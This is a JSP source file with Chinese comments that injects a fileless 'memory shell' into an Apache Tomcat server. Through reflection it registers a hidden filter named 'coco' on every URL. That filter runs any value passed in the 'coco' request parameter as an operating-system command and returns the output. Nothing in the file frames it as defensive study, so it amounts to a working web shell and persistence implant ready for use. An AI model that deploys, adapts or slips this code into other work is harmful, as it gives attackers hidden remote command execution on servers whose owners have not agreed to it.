<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.util.Map" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
try{
  //获取ApplicationContextFade对象，ApplicationContextFade是ServletContext的实现，所以其实是ServletContext对象
  ServletContext servletContext = request.getSession().getServletContext();
  Field appctx = null;
  try {
    appctx = servletContext.getClass().getDeclaredField("context"); //从ApplicationContextFade获取context，这里context是指ApplicationContext
  } catch (NoSuchFieldException e) {
    e.printStackTrace();
  }
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); //获取ApplicationContext

  Field standCtx = applicationContext.getClass().getDeclaredField("context");
  standCtx.setAccessible(true);
  StandardContext standardContext = (StandardContext) standCtx.get(applicationContext);


  Filter filter = new Filter() {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("coco") !=null) {
          InputStream in = Runtime.getRuntime().exec(req.getParameter("coco")).getInputStream();
          Scanner s = new Scanner(in).useDelimiter("\\A");
          String output = s.hasNext() ? s.next() : "";
          servletResponse.getWriter().write(output);
          return;
      }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
  };

  //把创建好的filter包装为FilterDef对象
  String filterName = "coco";
  FilterDef filterDef = new FilterDef();
  filterDef.setFilter(filter);
  filterDef.setFilterName(filterName);
  filterDef.setFilterClass(filter.getClass().getName());
  standardContext.addFilterDef(filterDef);  //调用addFilterDef加入到filterDefs

  //创建FilterMap并且加入到filterMaps
  FilterMap filterMap = new FilterMap();
  filterMap.setFilterName(filterName);
  filterMap.addURLPattern("/*");
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
  standardContext.addFilterMapBefore(filterMap);

  //从standardContext获取filterConfigs对象
  Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
  Configs.setAccessible(true);
  Map filterConfigs = (Map) Configs.get(standardContext);


  //利用反射创建filterConfig
  Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
  constructor.setAccessible(true);
  ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
  filterConfigs.put(filterName,filterConfig);


  out.write("Add Filter Memory Shell Success");
} catch (Exception e) {
  e.printStackTrace();
}
%>
